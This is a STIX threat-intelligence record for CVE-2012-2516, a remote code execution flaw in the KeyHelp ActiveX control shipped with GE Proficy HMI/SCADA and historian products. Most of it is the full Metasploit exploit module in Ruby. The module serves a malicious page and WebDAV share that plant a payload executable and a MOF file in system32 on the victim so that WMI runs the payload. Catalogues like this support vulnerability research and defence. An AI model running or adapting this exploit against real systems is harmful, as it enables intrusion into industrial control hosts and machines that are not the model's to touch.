{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--228901ec-7b9d-4fb6-b734-d1c42e4f99bf",
    "created": "2024-08-14T16:40:43.841038Z",
    "modified": "2024-08-14T16:40:43.841043Z",
    "name": "KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability",
    "description": " This module exploits a code execution vulnerability in the KeyScript ActiveX control from keyhelp.ocx. It is packaged in several products or GE, such as Proficy Historian 4.5, 4.0, 3.5, and 3.1, Proficy HMI/SCADA 5.1 and 5.0, Proficy Pulse 1.0, Proficy Batch Execution 5.6, and SI7 I/O Driver between 7.20 and 7.42. When the control is installed with these products, the function \"LaunchTriPane\" will use ShellExecute to launch \"hh.exe\", with user controlled data as parameters. Because of this, the \"-decompile\" option can be abused to write arbitrary files on the remote system.  Code execution can be achieved by first uploading the payload to the remote machine, and then upload another mof file, which enables Windows Management Instrumentation service to execute it. Please note that this module currently only works for Windows before Vista.  On the other hand, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically started by default on Windows XP SP3 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/keyhelp_launchtripane_exec.rb",
            "external_id": "keyhelp_launchtripane_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2516"
        },
        {
            "source_name": "reference",
            "url": "http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB14863"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :javascript => true,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{45E66957-2932-432A-A156-31503DF0A681}\",\n  #  :method     => \"LaunchTriPane\",\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in the KeyScript ActiveX\n        control from keyhelp.ocx. It is packaged in several products or GE, such as\n        Proficy Historian 4.5, 4.0, 3.5, and 3.1, Proficy HMI/SCADA 5.1 and 5.0, Proficy\n        Pulse 1.0, Proficy Batch Execution 5.6, and SI7 I/O Driver between 7.20 and 7.42.\n        When the control is installed with these products, the function \"LaunchTriPane\"\n        will use ShellExecute to launch \"hh.exe\", with user controlled data as parameters.\n        Because of this, the \"-decompile\" option can be abused to write arbitrary files on\n        the remote system.\n\n          Code execution can be achieved by first uploading the payload to the remote\n        machine, and then upload another mof file, which enables Windows Management\n        Instrumentation service to execute it. Please note that this module currently only\n        works for Windows before Vista.\n\n        On the other hand, the target host must have the WebClient service (WebDAV\n        Mini-Redirector) enabled. It is enabled and automatically started by default on\n        Windows XP SP3\n      },\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-2516' ],\n          [ 'OSVDB', '83311' ],\n          [ 'BID', '55265' ],\n          [ 'ZDI', '12-169' ],\n          [ 'URL', 'http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB14863' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #Windows before Vista because of the WBEM technique\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2012-06-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    print_status(\"The exe payload (C:\\\\windows\\\\system32\\\\msfmsf.exe) and mof file (C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\msfmsf.mof) must be removed manually.\")\n  end\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    ret = nil\n    # Check for MSIE and/or WebDAV redirector requests\n    if agent =~ /(Windows NT 5\\.1|MiniRedir\\/5\\.1)/\n      ret = targets[0]\n    elsif agent =~ /(Windows NT 5\\.2|MiniRedir\\/5\\.2)/\n      ret = targets[0]\n    elsif agent =~ /MSIE/\n      ret = targets[0]\n    else\n      print_error(\"Unknown User-Agent: #{agent}\")\n    end\n\n    ret\n  end\n\n\n  def on_request_uri(cli, request)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if (request.uri == '/') or not (request.uri =~ /\\/[^\\/]+\\//)\n      if (request.uri == '/')\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    end\n\n    # dispatch WebDAV requests based on method first\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request, mytarget)\n\n    when 'PROPFIND'\n      process_propfind(cli, request, mytarget)\n\n    when 'GET'\n      process_get(cli, request, mytarget)\n\n    when 'PUT'\n      print_status(\"Sending 404 for PUT #{request.uri} ...\")\n      send_not_found(cli)\n\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n\n    end\n\n  end\n\n\n  #\n  # GET requests\n  #\n  def process_get(cli, request, target)\n\n    print_status(\"Responding to GET request #{request.uri}\")\n    # dispatch based on extension\n    if (request.uri =~ /\\.chm$/i)\n      #\n      # CHM requests sent by IE and the WebDav Mini-Redirector\n      #\n      if request.uri =~ /#{@var_exe_name}/\n        print_status(\"Sending CHM with payload\")\n        send_response(cli, @chm_payload, { 'Content-Type' => 'application/octet-stream' })\n      elsif request.uri =~ /#{@var_mof_name}/\n        print_status(\"Sending CHM with mof\")\n        send_response(cli, @chm_mof, { 'Content-Type' => 'application/octet-stream' })\n      else\n        send_not_found(cli)\n      end\n    else\n      #\n      # HTML requests sent by IE and Firefox\n      #\n      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n      path = request.uri.gsub(/\\//, '\\\\\\\\\\\\')\n      payload_unc = '\\\\\\\\\\\\\\\\' + my_host + path + @var_exe_name + '.chm'\n      mof_unc = '\\\\\\\\\\\\\\\\' + my_host + path + @var_mof_name + '.chm'\n      print_status(\"Using #{payload_unc} for payload...\")\n      print_status(\"Using #{mof_unc} for the mof file...\")\n\n      html = <<-HTML\n      <html>\n      <body>\n      <script>\n      KeyScript = new ActiveXObject(\"KeyHelp.KeyScript\");\n\n      ChmPayloadFile = \"-decompile C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\ #{payload_unc}\";\n      ChmMofFile = \"-decompile c:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\mof\\\\\\\\ #{mof_unc}\";\n\n      KeyScript.LaunchTriPane(ChmPayloadFile);\n      setTimeout('KeyScript.LaunchTriPane(ChmMofFile);',3000);\n      </script>\n      </body>\n      </html>\n      HTML\n\n      html.gsub!(/\\t\\t\\t/, '')\n\n      print_status(\"Sending HTML page\")\n      send_response(cli, html)\n\n    end\n  end\n\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request, target)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request, target)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request\")\n    body = ''\n\n    if (path =~ /\\.chm/i)\n      print_status(\"Sending CHM multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\"?>\n<a:multistatus xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\" xmlns:c=\"xml:\" xmlns:a=\"DAV:\">\n<a:response>\n</a:response>\n</a:multistatus>\n|\n    elsif (path =~ /\\.manifest$/i) or (path =~ /\\.config$/i) or (path =~ /\\.exe/i)\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def generate_payload_chm(data)\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2012-2516\", \"template_payload.chm\")\n    fd = File.open(path, \"rb\")\n    chm = fd.read(fd.stat.size)\n    fd.close\n    chm << data\n    chm\n  end\n\n  def generate_mof_chm(data)\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2012-2516\", \"template_mof.chm\")\n    fd = File.open(path, \"rb\")\n    chm = fd.read(fd.stat.size)\n    fd.close\n    chm << data\n    chm\n  end\n\n  #\n  # When exploit is called, generate the chm contents\n  #\n  def exploit\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    @var_mof_name = rand_text_alpha(7)\n    @var_exe_name = rand_text_alpha(7)\n    payload_contents = generate_payload_exe\n    mof_contents = generate_mof(\"msfmsf.mof\", \"msfmsf.exe\")\n    @chm_payload = generate_payload_chm(payload_contents)\n    @chm_mof = generate_mof_chm(mof_contents)\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-26",
    "x_mitre_platforms": [
        "win'"
    ]
}